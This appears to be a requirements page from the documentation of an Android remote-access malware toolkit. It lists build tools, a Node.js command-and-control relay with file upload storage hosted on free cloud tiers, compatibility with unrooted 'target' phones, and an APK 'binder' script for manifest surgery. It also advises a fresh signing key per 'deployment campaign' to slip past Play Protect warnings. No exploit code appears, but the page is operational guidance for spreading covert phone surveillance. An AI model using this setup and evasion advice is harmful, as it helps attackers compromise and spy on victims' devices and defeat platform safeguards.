# 01 ⏤ System & Build Requirements

> This document outlines workstation build environment requirements, C2 server dependencies, target device compatibility, and OS support.

---

## 🛠️ Workstation Build Host

| Component | Minimum Version | Notes |
| :--- | :--- | :--- |
| **JDK** | JDK 17 or JDK 21 | **JDK 21 recommended.** Must be JDK (not JRE) for `keytool`. |
| **`JAVA_HOME`** | Configured | Required by both the builder wizard and `./gradlew`. |
| **Android SDK** | API 34+ (Android 14) | Build-tools `34.0.0+` for `aapt2`, `zipalign`, `apksigner`. |
| **Gradle** | Handled via `./gradlew` | Bundles Gradle 8.10.x. |
| **Python 3** | 3.8+ | Required for Option 7 APK manifest surgery (`binder.py`). |
| **`bc` or `awk`** | Installed | Required by `build.sh` for environment detection. |

*Note:* `build.sh` auto-detects Java and offers installation commands for `apt`, `dnf`, `pacman`, `brew`, `winget`, and `choco`.

---

## ☁️ C2 Relay Host (Node.js)

| Component | Minimum | Notes |
| :--- | :--- | :--- |
| **Node.js** | 18.0.0 | Required for `c2-server/server.js`. |
| **npm** | 9.0.0 | Manages Express, CORS, and WS dependencies. |
| **RAM** | 512 MB | Supported on Render.com free tier. |
| **Storage** | ~1 GB | File vault upload storage. |

Render.com free tier, Railway, and Fly.io are fully supported. (Render free tier sleeps idle instances after 15 minutes, resulting in a cold-start delay on the next check-in).

---

## 📱 Target Device Compatibility

- **Minimum OS:** Android 5.0 (Lollipop / API 21)
- **Target OS:** Android 14 through 17 (API 34 – 37) fully supported.
- **Tested OEMs:** Samsung, Google Pixel, OnePlus, Xiaomi, Motorola, HTC, LG, and generic emulators.
- **Root Status:** Unrooted. Root is optional and only required for priv-app / AOSP installation.

---

## 💻 Supported Host Operating Systems

- 🐧 **Linux:** Kali Linux, Ubuntu, Debian, Arch (full native support).
- 🍎 **macOS:** Monterey, Ventura, Sonoma, Sequoia (Intel & Apple Silicon M1/M2/M3/M4).
- 🪟 **Windows:** Windows 10 / 11 via PowerShell, CMD, or WSL2.

---

## ⚠️ Known Gotchas & Workarounds

- **AAPT2 SIGBUS (exit 138) on macOS arm64:** `build.sh` prefers `aapt` v1 from build-tools 30–34 to prevent Apple Silicon AAPT2 crashes.
- **First-Run Network Requirement:** Gradle requires an active internet connection on the first build to download wrapper dependencies.
- **Play Protect Warnings:** Unseen signing keys generate Play Protect warnings. Generate a fresh keystore per deployment campaign.
